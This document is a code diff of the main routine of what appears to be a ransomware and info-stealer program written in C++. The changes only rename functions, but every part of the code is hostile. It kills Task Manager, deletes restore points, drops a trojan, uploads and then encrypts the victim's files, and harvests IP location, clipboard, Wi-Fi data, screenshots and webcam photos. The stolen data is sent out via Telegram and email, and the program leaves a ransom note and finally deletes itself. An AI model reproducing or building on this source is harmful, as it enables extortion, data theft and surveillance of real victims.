@@ -19,18 +19,18 @@ int main(int argc, char* argv[])
         ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     if (TSK_REMOVER)
-        HANDLE hThreadTaskMng = CreateThread(NULL, 0, removeTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+        HANDLE hThreadTaskMng = CreateThread(NULL, 0, RemoveTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
 
     if (ANTI_DUMPER)
-        imageSizeIncreaser();
+        ImageSizeIncreaser();
 
     if (TROJAN) {
-        dropFile(TrojanFileContent, TROJANFILE);
-        HANDLE hThreadTrojan = CreateThread(NULL, 0, trojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+        DropFile(TrojanFileContent, TROJANFILE);
+        HANDLE hThreadTrojan = CreateThread(NULL, 0, TrojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
     }
     
     if (DELETE_RESTOREPOINT)
-        deleteRestorePoints();
+        DeleteRestorePoints();
 
 
     string dir;
@@ -39,24 +39,24 @@ int main(int argc, char* argv[])
     else {
         if (argc > 1)
             dir = argv[1];
-        else if (fileExists(DEBUG_FOLDER))
+        else if (FileExists(DEBUG_FOLDER))
             dir = DEBUG_FOLDER;
         else
             dir = (string)skCrypt(".\\");
     }
 
-    vector<string> files = getFiles(dir);
+    vector<string> files = GetFiles(dir);
 
     ofstream checkFile(CHECKSUM_FILE);
     checkFile << CHECK_CONTENT;
     checkFile.close();
     files.push_back(CHECKSUM_FILE);
 
-    vector<vector<string>> filesSplitted = vectorSplitter(files, MAX_THREADS);
+    vector<vector<string>> filesSplitted = VectorSplitter(files, MAX_THREADS);
     
     if (CHANGE_FILE_ICON) {
-        dropFile(FileIconContent, FILESICON);
-        changeIcon();
+        DropFile(FileIconContent, FILESICON);
+        ChangeIcon();
     }
 
 
@@ -64,15 +64,15 @@ int main(int argc, char* argv[])
 
     if (FILE_UPLOADER) {
         for (int i = 0; i < filesSplitted.size(); i++)
-            threads[i] = thread(uploadFiles, filesSplitted[i]);
+            threads[i] = thread(UploadFiles, filesSplitted[i]);
         for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish uploading files
             threads[i].join();
     }
 
-    string key = aes_encrypt(KEYOFKEY, generateRandom(32), IV);
+    string key = aes_encrypt(KEYOFKEY, GenerateRandom(32), IV);
 
     for (int i = 0; i < filesSplitted.size(); i++)
-        threads[i] = thread(encryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV));
+        threads[i] = thread(EncryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV));
 
 
     // info.txt
@@ -80,24 +80,24 @@ int main(int argc, char* argv[])
     string info_txt = (string)skCrypt("");
     info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
     if (STEAL_INFO) { //User infos -> semi-stealer
-        info_txt += (string)skCrypt("Date: ") + getDate() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("HWID: ") + getHWID() + (string)skCrypt("\n");
-        vector<string> ipData = split(getIPData(), '\n');
+        info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
+        vector<string> ipData = Split(GetIPData(), '\n');
         info_txt += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
         info_txt += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
         info_txt += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
         info_txt += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
         info_txt += (string)skCrypt("Longitude: ") + ipData[4] + (string)skCrypt("\n");
-        vector<string> systemData = split(getCPU(), '\n');
+        vector<string> systemData = Split(GetCPU(), '\n');
         info_txt += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
         info_txt += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
         info_txt += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("GPU name: ") + getGPU() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Host name: ") + getPcName() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Username: ") + getUserName() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Screen resolution: ") + getResolution() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Windows version: ") + getWinVersion() + (string)skCrypt("\n");
-        info_txt += (string)skCrypt("Language: ") + getLanguage() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("GPU name: ") + GetGPU() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Host name: ") + GetPcName() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Username: ") + GetUsername() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Screen resolution: ") + GetResolution() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Windows version: ") + GetWinVersion() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Language: ") + GetLanguage() + (string)skCrypt("\n");
     }
     info_txt = aes_encrypt(KEY, info_txt, IV);
     infoFileContent += info_txt;
@@ -114,7 +114,7 @@ int main(int argc, char* argv[])
     // links.txt
     string links_txt = (string)skCrypt("");
     if (FILE_UPLOADER)
-        for (string link : getLinks())
+        for (string link : GetLinks())
             links_txt += link + (string)skCrypt("\n");
     links_txt = aes_encrypt(KEY, links_txt, IV);
     infoFileContent += links_txt;
@@ -122,24 +122,24 @@ int main(int argc, char* argv[])
 
     // clipboard.txt
     if (GET_CLIPBOARD)
-        infoFileContent += aes_encrypt(KEY, getClipboard(), IV);
+        infoFileContent += aes_encrypt(KEY, GetClipboard(), IV);
     infoFileContent += skCrypt("\n");
 
     // wifi.txt;
     if (GET_WIFI)
-        infoFileContent += aes_encrypt(KEY, getWifi(), IV);
+        infoFileContent += aes_encrypt(KEY, GetWifi(), IV);
     infoFileContent += skCrypt("\n");
 
     // screenshot.bmp
     if (GET_SCREENSHOT)
-        infoFileContent += aes_encrypt(KEY, getScreenshot(), IV);
+        infoFileContent += aes_encrypt(KEY, GetScreenshot(), IV);
     infoFileContent += skCrypt("\n");
 
     // photos
     string webcams = (string)skCrypt("");
     if (TAKE_WEBCAMS) {
-        takeWebcams();
-        for (string file : getWebcams())
+        TakeWebcams();
+        for (string file : GetWebcams())
             webcams += file + "\n";
     }
     webcams = aes_encrypt(KEY, webcams, IV);
@@ -147,10 +147,10 @@ int main(int argc, char* argv[])
     infoFileContent += skCrypt("\n");
 
     if (ANTI_DUMPER)    // here because it creates problems first
-        peHeaderDeleter();
+        PEHeaderDeleter();
 
     if (DEBUG && BACKUP_INFOFILE) {    // make a backup of infoFile
-        ofstream infoFileBackup(split(INFOFILE, '\\').back());
+        ofstream infoFileBackup(Split(INFOFILE, '\\').back());
         infoFileBackup << infoFileContent;
         infoFileBackup.close();
     }
@@ -163,14 +163,14 @@ int main(int argc, char* argv[])
     }
 
     if (DEBUG ? DEBUG_SEND_TGBOT : SEND_TGBOT)
-        sendTelegramInfo();
+        SendTelegramInfo();
 
     if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
-        if (isConnected2Internet())
-            sendEmail();
+        if (IsConnected2Internet())
+            SendEmail();
         else {
-            dropFile(EmailSenderContent, EMAILSENDER);
-            scheduleTask();
+            DropFile(EmailSenderContent, EMAILSENDER);
+            ScheduleTask();
         }
     }
 
@@ -184,16 +184,16 @@ int main(int argc, char* argv[])
     
 
     if (DROP_README)
-        dropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
+        DropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
 
     if (DROP_DECRYPTOR)
-        dropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt"));
+        DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"));
 
     if (DROP_CUSTOM_FILE)
-        dropFile(CustomFileContent, CUSTOMFILE_LOC);
+        DropFile(CustomFileContent, CUSTOMFILE_LOC);
 
     if (CHANGE_WALLPAPER)
-        changeWallpaper(WallpaperContent);
+        ChangeWallpaper(WallpaperContent);
 
     if (SEND_CUSTOM_COMMAND)
         system((CUSTOM_COMMAND).c_str());
@@ -209,7 +209,7 @@ int main(int argc, char* argv[])
     }
 
     if (!DEBUG && argc > 0 && SELFKILL)
-        deleteMe((string)argv[0]);
+        DeleteMe((string)argv[0]);
 
     return 0;
 }
